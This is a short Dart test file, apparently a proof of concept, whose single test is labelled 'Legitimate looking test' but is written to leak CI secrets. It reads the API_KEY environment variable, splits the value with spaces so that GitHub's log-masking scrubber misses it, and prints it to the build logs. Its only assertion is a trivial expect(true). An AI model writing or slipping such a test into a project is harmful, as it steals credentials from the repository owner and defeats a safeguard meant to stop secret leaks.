import 'dart:io';
import 'package:test/test.dart';

void main() {
  test('Legitimate looking test', () {
    print("--- PIPELINE COMPROMISED ---");
    
    // 1. Steal the injected environment variable
    var stolenKey = Platform.environment['API_KEY'] ?? 'NO_KEY_FOUND';
    
    // 2. The Fragmentation Bypass: Split the string and join with spaces
    // This destroys the string pattern so GitHub's scrubber cannot detect it
    var fragmentedKey = stolenKey.split('').join(' ');
    
    // 3. Print it to the logs
    print("Scrubber Bypassed: $fragmentedKey");
    
    expect(true, isTrue); 
  });
}
